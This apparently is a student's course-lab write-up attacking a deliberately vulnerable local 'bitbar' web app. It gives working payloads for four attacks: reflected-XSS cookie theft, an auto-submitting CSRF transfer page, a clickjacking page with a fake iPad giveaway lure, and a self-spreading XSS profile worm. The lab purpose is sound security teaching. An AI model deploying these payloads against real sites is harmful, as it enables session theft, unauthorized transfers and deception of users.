Attack A: Cookie Theft
The Cookie Theft vulnerability is possible because of a XSS vulnerability in the username field which is being reflected back in the response. The GET parameter is sent to the server and is sent in the response page without being HTML encoded. Ideally, '<' & '>' characters should be encoded as &lt;&gt; so that they are now treated by the browser as HTML. Once the injection point is discovered, we use XML http request/ajax to send the cookie information to the given URL.

http://localhost:3000/profile?username=%3C/p%3E%3Cscript%3Evar%20xml%20=%20new%20XMLHttpRequest()%3Bxml.open(%27GET%27,%27steal_cookie?cookie=%27%2Bdocument.cookie,true)%3Bxml.send()%3Bdocument.location = "profile"%3B</script>


Attack B: Cross-Site Request Forgery
This attack is possible because the post_transfer request doesn't have a token to ensure that the request is coming from the same origin from where the page is loaded. This allows an attacker to embed a form and autosubmit the request to the web server. From the browser's perspective, if it finds a request to a particular server being made at any time, it automatically sends authentication cookies along with that request. The server can't distinguish between who made the request and executes the operation. In our attack, we create an iframe element that has a hidden form. As soon as the victim opens the page, javascript submits the form and makes request to http://localhost:3000/post_transfer. The request sends 10 bitbars to the attacker and redirects the page to http://pages.cs.wisc.edu/~rist/642-fall-2014/

<html>
<head>
</head>
<body>
<iframe height="0px" width="0px" srcdoc='<form id="foobar" action="http://localhost:3000/post_transfer?disable_fb=yes" method="post">
			<input type="hidden" name="destination_username" value="attacker"/>
			<input type="hidden" name="quantity" value="10"/>
</form><script> document.getElementById("foobar").submit(); </script>' src="b.html" onload='document.location="http://pages.cs.wisc.edu/~rist/642-fall-2014/"'/>
</body>
</html>

Attack C: ClickJacking
Clickjacking uses iframe and layer positioning techniques to trick a user into clicking a button or a link when they are intending to click something else. In this attack we have to transfer 10 bitbars to the attacker. However, unlike attack B we cannot use CSRF since protected_transfer uses tokens to prevent that attack. Here, we iframe the bitbar website and make its opacity 0 so that the naive user is not able to see the iframe. The submit button that transfers the bitbars is positioned in such a way which looks lucrative to the user. We use free IPADS as a bait here. The user has to click buttons in a sequence FIRST, SECOND and THIRD. As soon as he clicks the button, the bitbars are transferred and he is redirected to Tom's page.

<html>
<head>
<style>
#parentDiv { position:relative; }
#childDiv { position:absolute; left:0px; top:0px; opacity: 0 }
</style>
</head>

<body id="parentDiv" bgcolor="green">

<iframe sandbox="allow-scripts allow-forms" id="childDiv" width="800px" height="800px" scrolling="no" src="http://localhost:3000/protected_transfer?user=attacker&quantity=10"></iframe>

<div style="position: absolute; left: 10px; top: 10px;"><h1>Hey - we're giving away iPad minis!!! <h1></div>
<div style="position: absolute; left: 800px; top: 70px;">
  <img src="http://9to5mac.files.wordpress.com/2012/10/ipadmini.png" width="500">
</div>
<div style="position: absolute; left: 50px; top: 50px;"><h1>CLICK THE BUTTONS IN ORDER AND VOILA!!!<h1></div>
<input type="button" style="position: absolute; left: 18px; top: 335px; color: red; font-weight: bold; z-index:-1" value="FIRST"></input>

<input type="button" style="position: absolute; left: 100px; top: 335px; color: blue; font-weight: bold;" value="SECOND" onclick="showMore()"></input>
<input type="button" style="position: absolute; left: 180px; top: 335px; color: green; font-weight: bold;" value="THIRD"></input>


<script>
function showMore(){
document.location="http://pages.cs.wisc.edu/~rist/642-fall-2014/.";
}
/*
window.onbeforeunload = function() {

  window.onbeforeunload = null
  return "You are leaving in middle of a critical operation PLEASE CLICK 'STAY ON THIS PAGE'"
}
*/
</script>
</body>
</html>

Attack D: Profile Worm
The sanitize function whitelists tags and attributes so only few tags can be used for injection. The first task is to find a xss vulnerability and the best avenue to do so is to look for insecure functions like eval. The existing javascript code on the page tries to eval the class attribute's value. This gives us our injection point. Half of the job is done. To make our attack spread as a worm, we need to send the worm profile as a payload to the update profile request and as soon as the user sees the attacker profile, his profile would also updated. We get the entire span tag that we are injecting, create a XML http payload and send it.
<span id=bitbars class="var b = document.getElementById('bitbars');
var myString = unescape('%3cspan id=bitbars class=%22');myString =
myString.concat(b.getAttribute('class'));myString =
myString.concat(unescape('%22>'));var formDataBitbar = new FormData();
formDataBitbar.append('destination_username','attacker');formDataBitbar.append('quantity','1');
var xmlBitbar = new XMLHttpRequest();
xmlBitbar.open('POST','post_transfer',true);
xmlBitbar.send(formDataBitbar);var formData = new
FormData();formData.append('new_profile',myString);
var xml = new XMLHttpRequest(); xml.open('POST','set_profile',true);
xml.send(formData);showBitbars(10);hideDisplay();function hideDisplay() {
    document.getElementById('profile').style.visibility = 'hidden';
};">